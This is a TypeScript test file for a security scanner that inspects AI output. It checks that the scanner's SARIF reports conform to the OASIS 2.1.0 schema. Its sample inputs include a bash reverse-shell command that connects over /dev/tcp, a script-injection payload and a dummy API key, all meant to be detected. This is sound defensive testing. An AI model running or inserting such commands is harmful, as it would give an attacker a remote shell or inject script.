import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import AjvDraft04 from 'ajv-draft-04'
import addFormatsImport from 'ajv-formats'
import { scanOutput } from '../src/output-scanner.js'
import { auditWithDetails } from '../src/scanner.js'
import { outputScanToSarif, auditToSarif } from '../src/sarif.js'

// The vendored schema is the OASIS SARIF 2.1.0 errata01 canonical (JSON Schema
// draft-04) — the same document the emitter names in every log's `$schema`.
// ajv-draft-04 is required because ajv v8 does not ship the draft-04 meta.
const Ajv = (AjvDraft04 as unknown as { default?: typeof AjvDraft04 }).default ?? AjvDraft04
const addFormats =
  (addFormatsImport as unknown as { default?: typeof addFormatsImport }).default ??
  addFormatsImport

const schema = JSON.parse(
  readFileSync(new URL('../schemas/sarif-2.1.0.json', import.meta.url), 'utf8'),
)
const ajv = new Ajv({ strict: false, allErrors: true })
addFormats(ajv)
const validateSarif = ajv.compile(schema)

function assertValid(log: unknown) {
  const ok = validateSarif(log)
  if (!ok) {
    const detail = (validateSarif.errors || [])
      .slice(0, 10)
      .map((e: any) => `  ${e.instancePath || '(root)'} ${e.message}`)
      .join('\n')
    throw new Error(`SARIF schema validation failed:\n${detail}`)
  }
  expect(ok).toBe(true)
}

describe('SARIF output conforms to the vendored OASIS 2.1.0 schema', () => {
  it('output scan with multiple threats', () => {
    const text = '<script>alert(1)</script> then bash -i >& /dev/tcp/e/4444 0>&1'
    assertValid(outputScanToSarif(scanOutput(text), { scannedText: text }))
  })

  it('clean output (zero results)', () => {
    const text = 'Hello, how can I help you today?'
    assertValid(outputScanToSarif(scanOutput(text), { scannedText: text }))
  })

  it('credential finding (redacted snippet)', () => {
    const text = 'key: sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAA'
    assertValid(outputScanToSarif(scanOutput(text), { scannedText: text }))
  })

  it('multiline region', () => {
    const text = 'safe line\n<script>alert(1)</script>'
    assertValid(outputScanToSarif(scanOutput(text), { scannedText: text }))
  })

  it('failed invocation with toolExecutionNotifications', () => {
    const log = outputScanToSarif(scanOutput(''), {
      scannedText: '',
      executionSuccessful: false,
      error: { message: 'boom', standardError: 'Error: boom' },
    })
    assertValid(log)
  })

  it('prompt-audit missing defenses', () => {
    const text = 'You are a helpful assistant.'
    assertValid(auditToSarif(auditWithDetails(text), { scannedText: text }))
  })
})
